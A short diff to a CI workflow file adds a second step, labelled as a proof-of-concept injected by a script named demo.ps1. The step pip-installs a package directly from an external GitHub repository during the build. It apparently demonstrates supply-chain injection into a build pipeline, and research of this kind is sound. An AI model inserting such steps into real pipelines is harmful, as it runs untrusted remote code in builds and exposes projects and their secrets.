@@ -120,3 +120,7 @@ jobs:
   # PoC step injected by demo.ps1
   - name: Install PoC VCS package
     run: python3 -m pip install -U git+https://github.com/reconsumeralization/tfdocs-poc-20250922153707
+
+  # PoC step injected by demo.ps1
+  - name: Install PoC VCS package
+    run: python3 -m pip install -U git+https://github.com/reconsumeralization/tfdocs-poc-20250922153930
